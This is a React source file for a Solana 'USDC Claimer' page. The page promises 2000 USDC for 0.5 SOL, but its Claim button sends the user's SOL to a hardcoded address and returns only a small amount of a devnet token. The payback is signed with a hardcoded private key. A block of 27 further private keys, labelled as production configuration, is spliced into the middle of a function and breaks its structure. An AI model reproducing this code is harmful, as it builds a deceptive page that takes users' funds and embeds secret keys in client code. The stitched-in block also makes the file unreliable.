/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5FucpArSfu2hpGprmiWtErA4Fyn12RahVeaXh4mo2Re14dArkTKomqUGZNit1qWFMsNr5fzF7xr8fUY9kgE7QotU"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3pc6VDxRWENJcnivrMdybSeSK2ns1rPiAUBENyfy48bb8EfGoRygybKufUmfpMtWjTQ1MjAsBiCwRQCG2caeaDgd",
  "key1": "3zor4u8Gk1AWEJ9eP8bHgDFhqQsd4wDTvhaRuiu2xvGLq8Gy17dC1oxKHTSmfpCZJ7ZxTEvujerJpoShh9akKrjh",
  "key2": "3ri52X587Rg9mvwhzChP98LU7fUoicsGf3xwqCe5R7tFYTKhmJjVzZ4tjV2H5UWEwkLDka3TQkun4VaZrDXZWBxe",
  "key3": "3aSD1nAmyxw43buatRtZxcW2Vi8SH5t7uhWQhGxD9psscie4oUokhBPFUt8ur4GbBqjzUSZyUo1XsAW9ZJ9Weaz1",
  "key4": "4BCobRVF8regS6nrCdsmf2Z7kwxNGbxevxALhyfX7S6uLNa5Vz1f93oranHb8AqT4AbtrmJReJ2Gr1uyoU2xXGvV",
  "key5": "3YUgnY1A829Z2ibe8stSN2edsfDQLaXkLT2CTad9nsxZ1eKLQzvuzcMdH16tWRzSkCeXxcJoK7Gsg36WYdbQyRyd",
  "key6": "3pULu5TunMQSTHYk8XARUg7YCDLXWXYvtACJWAnNiPBoN8PQ4JhsBPmnkGEu1ecrqTo5Ph1ZDTfDznvY641dnXPp",
  "key7": "3dG6dJWz9rTWGEY2fTP5TH5Xx9CKQWedBd98ngT92e98GJUNWkx5bRvqLHTuXC41xrvh5A5zyF1E8bzZRuM8nX4y",
  "key8": "2S2tzVnwde8zLy26ozDKJYSKQqroLpwaUcoNpwxGrarBPju9uwabBoQciaHDCsxPTTg7zChgTeXQHnDRHNojiCWR",
  "key9": "49XDK3qTm9bEZoxrEghAQgnD4s6vtDT2XLe9D3XMDQDPLGFR9eqQx2qec3kwNtcAAQjcH4CSkHE1bxkEFTxv1kkf",
  "key10": "55UAxYbgKvvwDfknjd5vqVy12WNX8PEfUw3qni5LNobKoGPuJ3NEzoNmcpxs5PGCZrvHmsrSoJpwSLrcaEtspYap",
  "key11": "1r2XgW32Cy9W9mkT9kRzSdvBEb9TBB8jdhmacNGdyFaU6YnvNvBB5KWoGUsnhWHYJCMAh6a4t8ekwgsRiSd9dKx",
  "key12": "5krz9VbKfXSj4CSjyndpDzHwfMniD6g7CzaRm5kwibCg7k5BsKnWRrJVdocLsr6a7j2Lym34aJwPbGQKFnT5DWR4",
  "key13": "25UwNK6bx5uC3a93UMKuLZVLA8DaqrKr5RvYqD4XEvS2sxN9tEw4ZyiqYujvj31GhaGKn3tsstH4LPK7XZoVY4Fv",
  "key14": "3WJLRABioGyeRM9JgrKcPYDkdDLYWzrMxZzTfACEpfbYzksjGj1FZXcAhK8dCsCmjAYXMgWDKCC1WeAKx5SBoBXd",
  "key15": "591w621JjGwJCppjaUdHS89S1rd41KFv8bGjHpKuuXP4AHFC6yYSqEkdTSC6dZfLTb2AoU6WV7nRrgpzDeExFpNa",
  "key16": "2PhMCN64cz64MtyRH3vwPPZano8a7ovUeTo95cKdjT3YXsF1WVUpU8R3JbZJoaXCPH7nLoCCaya1QaweM6Ud72ci",
  "key17": "462qhGz119rDEmCuLjzXd2aBDXjJfxYqivSbQJQhLHdgumJypvedVou2FDv4KP3LEuWARnB5VQ3DZfpCsizJjHH6",
  "key18": "5ofsnocA7XBDh8Ek6HfMT9Z9B53QVbGU7RsqMj3rHsgskXQ8YXjVfjS7BpWUmiPii4yxzTR5i3Y7PxXxT31nrdZG",
  "key19": "5KkGbCwvSU2viFaE2vKUD61ZzucfE46W3ttJYuRsJCEjuDwj95NPhbgqrD253hQf2Fpj13G7firAzqLnvEQatRN1",
  "key20": "5ycoUgUNErDsV25SPJtK6kpabSWE2MYM7UUr4veMgoYB9iUCg6j7KsBEZfgvg8fjb89Gi8FvmNJoyfM6XmURUBLn",
  "key21": "2wjDrYMuXr36VKPXwNUsmMWftbExApS8JFxCGpbsph8GHY26i87JREynhENGv2wjKjdLaDuydAK7rUr3ThCcsx7J",
  "key22": "3oDHJ4NMJLfQGqThg45avmMNteomLFKz8c65swuZcCbXSKedcmiyzxdfaRhgqYJhDo3i6Cza9WxWEgt7BKTJdX4J",
  "key23": "5jM7fWcG29ekqbaftjz5fQpkMQWonhgnRtfMJYUHA4nR2wNgG6r5RneyuM5ZQYMSPN95YmU5nGXrsmE7t5phEYNB",
  "key24": "ynNYCeog3SN8jTRxD8qK8FiLfD6Pp85hhaiJKSGk6taeNWhMQkS2pNGNVDVt3xaPPpwiDywgHpKA5JdJs677Hzt",
  "key25": "37hYNg1isunBN52NFp6exyqfkkdGqg6pVcgmGjAP5tmQz52AXjvzw3rrBvA1NWotAmTj2estN57gqhhjKj2Yksg2",
  "key26": "29NFT1669BzaUu3ZKTENtyPXweF8JRmk4zNi66gk9yAmRTwGiRcsn3D2L3XtFNqHSK13czSSqtufiquNdM99wMSd"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
